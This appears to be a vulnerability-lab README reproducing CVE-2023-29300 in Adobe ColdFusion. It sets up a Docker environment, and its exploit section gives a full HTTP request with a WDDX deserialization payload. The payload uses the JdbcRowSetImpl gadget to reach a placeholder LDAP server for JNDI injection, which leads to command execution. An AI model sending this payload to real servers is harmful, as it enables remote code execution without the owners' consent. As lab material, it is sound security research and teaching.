# Adobe ColdFusion XML Deserialization Leads to RCE (CVE-2023-29300)

[中文版本(Chinese version)](README.zh-cn.md)

Adobe ColdFusion is a commercial rapid web-application development computing platform created by J. J. Allaire in 1995.

Adobe ColdFusion versions 2018 Update 16 (and earlier), 2021 Update 6 (and earlier) and 2023.0.0.330468 (and earlier) are affected by a deserialization of untrusted data vulnerability. Attacker is able to call arbitrary setter function and execute arbitrary commands eventually.

References:

- <https://blog.projectdiscovery.io/adobe-coldfusion-rce/>
- <https://xz.aliyun.com/t/13413>

## Vulnerable environment

Start a Adobe ColdFusion 2018.0.15:

```
docker compose up -d
```

After a few minutes wait, visit `http://your-ip:8500/CFIDE/administrator/index.cfm` with password `vulhub`, you can install the Adobe ColdFusion successfully.

## Exploit

To exploit this issue, you have to find a valid gadget to execute arbitrary code in ColdFusion server. The most common gadget is `com.sun.rowset.JdbcRowSetImpl` that uses the JNDI injection to execute the command.

We utilize the [Java Chains](https://github.com/vulhub/java-chains) tool for vulnerability reproduction. To get started with Java Chains, please visit the [Quick Start](https://java-chains.vulhub.org/docs/guide) guide.  Then, following the instructions in the screenshot below, generate a payload based on the `CommonsBeanutils1` exploit chain.

![](1.png)

Then, send the following request to ColdFusion server (replace with your LDAP server address):

```
POST /CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 333

argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='xcom.sun.rowset.JdbcRowSetImplx'><var name='dataSourceName'><string>ldap://your.ldap.server/example</string></var><var name='autoCommit'><boolean value='true'/></var></struct></data></wddxPacket>
```

As you can see, the `touch /tmp/success` is executed successfully:

![](2.png)
